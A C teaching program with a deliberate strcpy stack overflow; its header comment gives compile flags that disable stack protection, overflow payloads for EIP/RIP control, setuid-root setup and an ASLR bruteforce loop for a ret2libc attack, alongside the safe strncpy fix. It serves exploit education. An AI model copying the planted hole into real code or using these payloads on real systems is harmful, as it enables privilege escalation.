/* ret2libc-stack-overflow.c
   Testing program with a stack-based overflow vulnerability located in the
   'overflow()' program's function. The overflow occures when 'strcpy()' copies
   data from the argument vector to the destination character array.

   This program is intended to:
    1) Illustrate why unsafe functions such as 'strcpy()' are well ... unsafe.
    2) How to leverage the ret2libc attack technique and the symbols resolution.
    3) How to bruteforce ASLR, and how fast it is due to the weak entropy on x86.

   There is no bound checking for the standard 'strcpy()' function, which make
   its use strongly discouraged.

   Added bonus, call to a C standard library's function 'system()'. The latter
   calls the 'whoami' system program which should returns the current user (or
   privilege).

   Compile (32-bit):
   cc -m32 -fno-stack-protector ret2libc-stack-overflow.c -o \
   ret2libc-stack-overflow

   Overflow & EIP Control (32-bit):
   ./ret2libc-stack-overflow "`python -c 'print "A" * 264 + "B" * 4 + "R" * \
   4'`"

   Compile (64-bit):
   cc -fno-stack-protector ret2libc-stack-overflow.c -o ret2libc-stack-overflow

   Overflow & RIP Control (64-bit):
   ./ret2libc-stack-overflow "`python -c 'print "A" * 256 + "B" * 8 + "R" * \
   8'`"

   Proof of concept setup:
   sudo chown root:root ret2libc-stack-overflow
   sudo chmod +s ret2libc-stack-overflow

   ASLR bruteforce example (static RET usually gives great results):
   for i in {1..1000000}; do echo ASLR Bruteforce Tries: $i && \
   ./ret2libc-stack-overflow "`python -c 'print "A" * 264 + "B" * 4 + \
   "\x84\xa5\x63\x56"'`" && break; echo EXPLOIT FAILED; sleep .001; clear; \
   done;
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void innocent(void) {
  system("/usr/bin/whoami");
}

void overflow(char **argv) {
  char dst[256];

  strcpy(dst, argv[1]);
  // A wise and informed developper would do as below:
  // strncpy(dst, argv[1], 255);
  // dst[255] = '\0';
  printf("%s\n", dst);
}

int main(int argc, char *argv[]) {
  if (argc > 1)
    overflow(argv);
  return 0;
}
